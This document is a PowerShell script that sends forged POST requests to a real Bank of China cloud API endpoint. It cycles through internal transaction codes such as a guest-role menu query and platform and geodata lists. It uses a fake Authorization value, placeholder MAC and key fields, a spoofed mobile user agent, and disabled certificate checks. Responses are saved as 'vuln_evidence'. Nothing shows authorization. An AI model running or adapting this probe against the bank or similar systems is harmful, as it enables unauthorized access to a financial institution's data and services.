$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

$target = "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest"

$apis = @(
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest"; Body=@{sysId="M39"; roleId="styy-guest"}},
    @{TranCode="CHANNEL/getPlatformBaseInfoList"; Body=@{}},
    @{TranCode="AGRE-AGRE/queryAgreementTypeList"; Body=@{}},
    @{TranCode="CUST-INFO/getGeoData"; Body=@{}}
)

$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

$idx = 0
foreach ($api in $apis) {
    $idx++
    $bodyObj = @{
        Header = @{
            CurrentPageNum = 1
            PageTotalNum = 10
            NoRetCode = $true
            BranchId = "800000"
            LegalRepCode = "10000"
            TranTeller = ""
            TranCode = $api.TranCode
            TranDate = "20260716"
            TranTime = "004500000"
            ServiceName = $api.TranCode.Split("/")[1]
            ServiceCode = "D20190130"
            AuthFlag = "0"
            AuthrTellerNo = "1"
            Channel = "39"
            ConsumerId = "1"
            GlobalSeq = "1"
            GlobalSeqNo = "1"
            KeyId = "1"
            LocalLang = "1"
            Mac = "1"
            SourceSysId = "1111"
            TerminalCode = "1121"
            TranSeq = "1"
            TranSeqNo = "1"
            TranTellerNo = "1"
            ExtendContent = "1"
            TotalNum = "0"
        }
    }
    foreach ($k in $api.Body.Keys) { $bodyObj[$k] = $api.Body[$k] }
    $bodyJson = $bodyObj | ConvertTo-Json -Depth 10 -Compress

    $safeName = $api.TranCode -replace "[/\\]", "_"
    $bodyFile = Join-Path $outDir ("req_" + $safeName + ".json")
    $respFile = Join-Path $outDir ("resp_" + $safeName + ".json")
    $bodyJson | Out-File -FilePath $bodyFile -Encoding utf8 -Force -NoNewline

    Write-Host "[$idx/$($apis.Count)] Testing $($api.TranCode) ..."

    # Call curl.exe with argument array (no shell parsing issues)
    $curlArgs = @(
        "-s", "-k",
        "--noproxy", "*",
        "-X", "POST",
        "-H", "Authorization: 987654321",
        "-H", "Content-Type: application/json",
        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 10; LE2110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "-H", "Accept: application/json",
        "-H", "Origin: https://dl.brcloud.bankofchina.com",
        "-H", "Referer: https://dl.brcloud.bankofchina.com/dlydjd/",
        "--data-binary", "@$bodyFile",
        "-o", $respFile,
        "-w", "HTTP_CODE:%{http_code} SIZE:%{size_download} TIME:%{time_total}",
        "--max-time", "30",
        $target
    )

    $output = & curl.exe @curlArgs
    Write-Host "    Result: $output"

    if ((Test-Path $respFile) -and ((Get-Item $respFile).Length -gt 0)) {
        $content = Get-Content $respFile -Raw -Encoding utf8
        $len = $content.Length
        Write-Host "    Saved: $respFile ($len bytes)"
        $preview = if ($len -gt 500) { $content.Substring(0,500) + "..." } else { $content }
        Write-Host "    Preview: $preview"
    } else {
        Write-Host "    No response file created"
    }
    Write-Host ""
    Start-Sleep -Milliseconds 500
}

Write-Host "`n=== All tests completed. Results in $outDir ==="
